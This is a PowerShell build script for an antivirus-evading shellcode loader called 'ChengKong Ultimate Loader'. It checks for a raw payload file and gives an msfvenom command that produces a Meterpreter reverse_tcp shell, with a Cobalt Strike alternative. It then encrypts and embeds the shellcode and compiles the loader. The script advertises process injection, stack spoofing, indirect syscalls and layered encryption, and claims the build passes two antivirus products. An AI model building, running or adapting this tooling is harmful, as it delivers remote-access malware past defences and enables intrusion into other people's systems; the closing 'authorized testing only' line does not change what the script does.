# ChengKong Ultimate Loader - Build Script
# Author: ChengKong

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "ChengKong Ultimate Loader - Auto Build" -ForegroundColor Cyan
Write-Host "Author: ChengKong" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Step 1: Check payload_x64.bin
if (-not (Test-Path "payload_x64.bin")) {
    Write-Host "[ERROR] payload_x64.bin not found!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Please put your shellcode file in this directory:"
    Write-Host "  $PWD\payload_x64.bin"
    Write-Host ""
    Write-Host "How to generate shellcode:"
    Write-Host "  Cobalt Strike: Attacks > Packages > Windows Executable (S) > Raw"
    Write-Host "  Metasploit: msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o payload_x64.bin"
    Write-Host ""
    pause
    exit 1
}

$fileSize = (Get-Item "payload_x64.bin").Length
Write-Host "[1/4] Found payload_x64.bin" -ForegroundColor Green
Write-Host "      Size: $fileSize bytes"
Write-Host ""

# Step 2: Check Python
try {
    $null = python --version 2>&1
} catch {
    Write-Host "[ERROR] Python not found!" -ForegroundColor Red
    Write-Host "Please install Python 3.x from https://www.python.org/"
    Write-Host ""
    pause
    exit 1
}

# Step 3: Check pycryptodome
try {
    $null = python -c "from Crypto.Cipher import AES" 2>&1
} catch {
    Write-Host "[WARNING] pycryptodome module not found" -ForegroundColor Yellow
    Write-Host "[INFO] Installing pycryptodome..."
    pip install pycryptodome
    if ($LASTEXITCODE -ne 0) {
        Write-Host "[ERROR] Installation failed!" -ForegroundColor Red
        pause
        exit 1
    }
}

# Step 4: Encrypt shellcode
Write-Host "[2/4] Encrypting shellcode..." -ForegroundColor Yellow
Push-Location tools
python advanced_encrypt_shellcode.py
if ($LASTEXITCODE -ne 0) {
    Write-Host "[ERROR] Encryption failed!" -ForegroundColor Red
    Pop-Location
    pause
    exit 1
}
Pop-Location
Write-Host "      OK: Shellcode encrypted successfully" -ForegroundColor Green
Write-Host "      OK: Generated 3-layer encryption keys" -ForegroundColor Green
Write-Host ""

# Step 5: Update source code
Write-Host "[3/4] Updating source code..." -ForegroundColor Yellow
Push-Location tools
python update_shellcode.py
if ($LASTEXITCODE -ne 0) {
    Write-Host "[ERROR] Source code update failed!" -ForegroundColor Red
    Pop-Location
    pause
    exit 1
}
Pop-Location
Write-Host "      OK: Source code updated successfully" -ForegroundColor Green
Write-Host ""

# Step 6: Compile
Write-Host "[4/4] Compiling project..." -ForegroundColor Yellow
Push-Location src

# Find MSBuild
$msbuildPaths = @(
    "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe"
)

$msbuild = $null
foreach ($path in $msbuildPaths) {
    if (Test-Path $path) {
        $msbuild = $path
        break
    }
}

if (-not $msbuild) {
    Write-Host "[ERROR] MSBuild not found!" -ForegroundColor Red
    Write-Host "Please install Visual Studio 2019/2022"
    Write-Host "Download: https://visualstudio.microsoft.com/"
    Pop-Location
    pause
    exit 1
}

Write-Host "      Using MSBuild: $msbuild"
Write-Host ""

& $msbuild kong_ultimate.sln /p:Configuration=Release /p:Platform=x64 /t:Rebuild /v:minimal /nologo
if ($LASTEXITCODE -ne 0) {
    Write-Host ""
    Write-Host "[ERROR] Compilation failed!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Possible reasons:"
    Write-Host "  1. MASM (Microsoft Macro Assembler) not installed"
    Write-Host "  2. Missing Windows SDK"
    Write-Host "  3. Incomplete Visual Studio configuration"
    Write-Host ""
    Write-Host "Solution:"
    Write-Host "  Open Visual Studio Installer"
    Write-Host "  Modify installation -> Check 'Desktop development with C++'"
    Write-Host "  Make sure 'MASM' component is checked"
    Write-Host ""
    Pop-Location
    pause
    exit 1
}
Pop-Location
Write-Host "      OK: Compilation successful" -ForegroundColor Green
Write-Host ""

# Check output
if (Test-Path "src\x64\Release\kong_ultimate.exe") {
    $exeSize = (Get-Item "src\x64\Release\kong_ultimate.exe").Length
    
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "BUILD COMPLETE!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Output: src\x64\Release\kong_ultimate.exe"
    Write-Host "Size: $exeSize bytes"
    Write-Host ""
    Write-Host "How to run:"
    Write-Host "  cd src\x64\Release"
    Write-Host "  .\kong_ultimate.exe"
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "Technical Features" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "[+] Pool Party Injection"
    Write-Host "[+] Stack Spoofing"
    Write-Host "[+] Indirect Syscalls"
    Write-Host "[+] 3-Layer Encryption (S-box + XOR + AES-128-CBC)"
    Write-Host "[+] Staged Loading (128 bytes/chunk)"
    Write-Host "[+] Random Delays (50-150ms)"
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "Test Results" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "[+] 360 Total Security: PASS" -ForegroundColor Green
    Write-Host "[+] Huorong Security: PASS" -ForegroundColor Green
    Write-Host ""
    Write-Host "WARNING: For authorized testing only!" -ForegroundColor Yellow
    Write-Host ""
} else {
    Write-Host "[ERROR] Output file not found!" -ForegroundColor Red
    Write-Host "Expected location: src\x64\Release\kong_ultimate.exe"
    Write-Host ""
}

pause
